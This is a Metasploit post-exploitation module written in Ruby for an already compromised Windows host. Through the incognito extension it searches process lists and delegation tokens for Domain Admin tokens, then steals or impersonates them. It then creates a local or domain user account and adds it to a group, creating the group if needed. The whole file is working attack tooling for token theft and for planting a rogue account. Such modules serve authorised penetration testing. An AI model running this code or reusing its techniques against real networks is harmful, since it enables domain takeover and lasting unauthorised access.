##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Exploit::Deprecated

  moved_from 'post/windows/manage/add_user_domain'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Add User to the Domain and/or to a Domain Group',
        'Description' => %q{
          This module adds a user to the Domain and/or to a Domain group. It will
          check if sufficient privileges are present for certain actions and run
          getprivs for system.  If you elevated privs to system, the
          SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
          a process that is running as system. If you don't have privs, this script
          exits.
        },
        'License' => MSF_LICENSE,
        'Author' => 'Joshua Abraham <jabra[at]rapid7.com>',
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [true, 'The username of the user to add (not-qualified, e.g. BOB)']),
        OptString.new('PASSWORD', [false, 'Password of the user']),
        OptString.new('GROUP', [false, 'Add user into group, creating it if necessary']),
        OptBool.new('ADDTOGROUP', [true, 'Add group if it does not exist', false]),
        OptBool.new('ADDTODOMAIN', [true, 'Add to Domain if true, otherwise add locally', true]),
        OptString.new('TOKEN', [false, 'Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)', '']),
      ]
    )
  end

  def check_result(user_result)
    case user_result['return']
    when client.railgun.const('ERROR_ACCESS_DENIED')
      print_error 'Sorry, you do not have permission to add that user.'
    when client.railgun.const('NERR_UserExists')
      print_status 'User already exists.'
    when client.railgun.const('NERR_GroupExists')
      print_status 'Group already exists.'
    when client.railgun.const('NERR_UserNotFound')
      print_error 'The user name could not be found.'
    when client.railgun.const('NERR_InvalidComputer')
      print_error 'The server you specified was invalid.'
    when client.railgun.const('NERR_NotPrimary')
      print_error 'You must be on the primary domain controller to do that.'
    when client.railgun.const('NERR_GroupNotFound')
      print_error 'The group specified by the groupname parameter does not exist.'
    when client.railgun.const('NERR_PasswordTooShort')
      print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
    when client.railgun.const('ERROR_ALIAS_EXISTS')
      print_status 'The local group already exists.'
    when client.railgun.const('NERR_UserInGroup')
      print_status 'The user already belongs to this group.'
    when client.railgun.const('ERROR_MORE_DATA')
      print_status 'More entries are available. Specify a large enough buffer to receive all entries.'
    when client.railgun.const('ERROR_NO_SUCH_ALIAS')
      print_status 'The specified account name is not a member of the group.'
    when client.railgun.const('ERROR_NO_SUCH_MEMBER')
      print_status 'One or more of the members specified do not exist. Therefore, no new members were added.).'
    when client.railgun.const('ERROR_MEMBER_IN_ALIAS')
      print_status 'One or more of the members specified were already members of the group. No new members were added.'
    when client.railgun.const('ERROR_INVALID_MEMBER')
      print_status 'One or more of the members cannot be added because their account type is invalid. No new members were added.'
    when client.railgun.const('RPC_S_SERVER_UNAVAILABLE')
      print_status 'The RPC server is unavailable.'
    else
      print_error "Unexpectedly returned #{user_result}"
    end
  end

  ## steal domain admin token
  ## return code: bool
  def steal_token(domain_user, domain)
    if (session.sys.config.getuid == domain_user) || (domain_user == '')
      return true
    end

    ## load incognito
    if !session.incognito
      session.core.use('incognito')
    end

    if !session.incognito
      print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
      return false
    end

    ## verify domain_user contains a domain
    if domain_user.index('\\').nil?
      domain_user = "#{domain}\\#{domain_user}"
    else
      domain_user = ''
    end

    ## token is a PID
    target_pid = ''
    if (datastore['TOKEN'] =~ /^\d+$/)
      pid = datastore['TOKEN']

      session.sys.process.get_processes.sort_by { rand }.each do |x|
        if (pid == x['pid'])
          target_pid = pid
        end
      end
    ## token is a Domain User
    else
      session.sys.process.get_processes.sort_by { rand }.each do |x|
        if ((x['user'] == domain_user) && (target_pid == ''))
          target_pid = x['pid']
          print_status("Found token for #{domain_user}")
        end
      end
    end

    if target_pid != ''
      # Do the migration
      print_status("Stealing token of process ID #{target_pid}")
      session.sys.config.steal_token(target_pid)
      if domain_user != ''
        domain_user = session.sys.config.getuid
      else
        print_status("Stealing token of process ID #{target_pid}")
        session.sys.config.steal_token(target_pid)
        if domain_user != ''
          domain_user = session.sys.config.getuid
        end
      end

      if session.sys.config.getuid != domain_user
        print_error "Steal Token Failed (running as: #{session.sys.config.getuid})"
        return false
      end
    else
      print_status('No process tokens found.')
      if (domain_user != '')
        vprint_status('Trying impersonate_token technique...')
        session.incognito.incognito_impersonate_token(domain_user)
      else
        return false
      end
    end

    return true
  end

  ## enumerate if the session has a domain admin token on it
  ## Return: token_found,token_user,current_user; otherwise false
  def token_hunter(domain)
    ## gather data
    domain_admins = get_members_from_group('Domain Admins', get_domain('DomainControllerName'))

    ## load incognito
    if !session.incognito
      session.core.use('incognito')
    end

    if !session.incognito
      print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
      return false
    end

    domain_admins.each do |da_user|
      ## current user
      if session.sys.config.getuid == "#{domain}\\#{da_user}"
        print_good "Found Domain Admin Token: #{session.sid} - #{session.session_host} - #{da_user} (Current User)"
        return true, '', true
      end

      ## parse delegation tokens
      res = session.incognito.incognito_list_tokens(0)
      if res
        res['delegation'].split("\n").each do |user|
          ndom, nusr = user.split('\\')
          if !nusr
            nusr = ndom
            ndom = nil
          end
          next unless (ndom == domain) && (da_user == nusr)

          sid = session.sid
          peer = session.session_host
          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
          return true, nusr, false
        end
      end

      ## parse process list
      session.sys.process.get_processes.each do |x|
        next unless (x['user'] == "#{domain}\\#{da_user}")

        target_pid = x['pid']
        sid = session.sid
        peer = session.session_host
        report_note(
          host: session,
          type: 'domain.token.pid',
          data: { pid: target_pid, sid: sid, peer: peer, user: da_user },
          update: :unique_data
        )
        print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
        return true, da_user, false
      end
    end
    return false
  end

  def local_mode
    if datastore['PASSWORD'].nil?
      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
      print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}'")
    end
    #  Add user
    if enum_user.include? datastore['USERNAME']
      print_status("User '#{datastore['USERNAME']}' already exists.")
    else
      result = add_user(datastore['USERNAME'], datastore['PASSWORD'])
      if result['return'] == 0
        print_good("User '#{datastore['USERNAME']}' was added.")
      else
        check_result(result)
      end
    end

    #  Add localgroup
    if datastore['ADDTOGROUP'] && (!enum_localgroup.include? datastore['GROUP'])
      if datastore['GROUP']
        result = add_localgroup(datastore['GROUP'])
        if result['return'] == 0
          print_good("Group '#{datastore['GROUP']}'  was added.")
        else
          check_result(result)
        end
      else
        print_error('Check your group name')
      end
    end
    #  Add Member to LocalGroup
    if datastore['ADDTOGROUP'] && datastore['GROUP']
      result = add_members_localgroup(datastore['GROUP'], datastore['USERNAME'])
      if result['return'] == 0
        print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group.")
      else
        check_result(result)
      end
    end
  end

  def domain_mode
    ## check domain
    server_name = get_domain('DomainControllerName')
    if server_name
      print_good("Found Domain : #{server_name}")
    else
      print_error('No DC is available for the specified domain or the domain does not exist. ')
      return false
    end
    if datastore['PASSWORD'].nil?
      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
      print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}'")
    end
    ## enum domain
    domain = primary_domain
    if domain.nil?
      return
    end

    ## steal token if neccessary
    if datastore['TOKEN'] == ''
      token_found, token_user, current_user = token_hunter(domain)
      if token_found && current_user == false
        datastore['TOKEN'] = token_user
      end
    end

    ## steal token
    steal_token_res = steal_token(datastore['TOKEN'], domain)
    return if steal_token_res == false

    ## Add user to the domain
    if (enum_user(server_name).include? datastore['USERNAME'])
      print_status("#{datastore['USERNAME']} is already a member of the #{domain} domain")
    else
      print_status("Adding '#{datastore['USERNAME']}' as a user to the #{domain} domain")
      result = add_user(datastore['USERNAME'], datastore['PASSWORD'], server_name)
      if result['return'] == 0
        print_good("User '#{datastore['USERNAME']}' was added to the #{domain} domain.")
      else
        check_result(result)
      end
    end

    ## Add group to  domain
    if datastore['ADDTOGROUP'] && (!enum_group(server_name).include? datastore['GROUP'])
      if datastore['GROUP']
        result = add_group(datastore['GROUP'], server_name)
        if result['return'] == 0
          print_good("Group '#{datastore['GROUP']}'  was added!")
        else
          check_result(result)
        end
        if (!enum_group(server_name).include? datastore['GROUP'])
          print_error("The #{datastore['GROUP']} group not exist in the domain. It is possible that the same group name exists for the local group.")
        end
      else
        print_error('Check your group name')
      end
    end

    if datastore['ADDTOGROUP'] && (enum_group(server_name).include? datastore['GROUP'])
      ## check if user is already a member of the group
      members = get_members_from_group(datastore['GROUP'], server_name)
      # Show results if we have any, Error if we don't
      if members.include? datastore['USERNAME']
        print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
      else
        print_status("Adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' Domain Group")
        result = add_members_group(datastore['GROUP'], datastore['USERNAME'], server_name)
        if result['return'] == 0
          print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
        else
          check_result(result)
        end
      end
    end
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module on '#{sysinfo['Computer']}'")
    if datastore['ADDTODOMAIN']
      print_status('Domain Mode')
      domain_mode
    else
      print_status('Local Mode')
      local_mode
    end
    return nil
  end

  def primary_domain
    dom_info = get_domain('DomainControllerName')
    if !dom_info.nil? && dom_info =~ /\./
      foo = dom_info.split('.')
      domain = foo[1].upcase
    else
      print_error("Error parsing output from the registry. (#{dom_info})")
    end
    return domain
  end
end
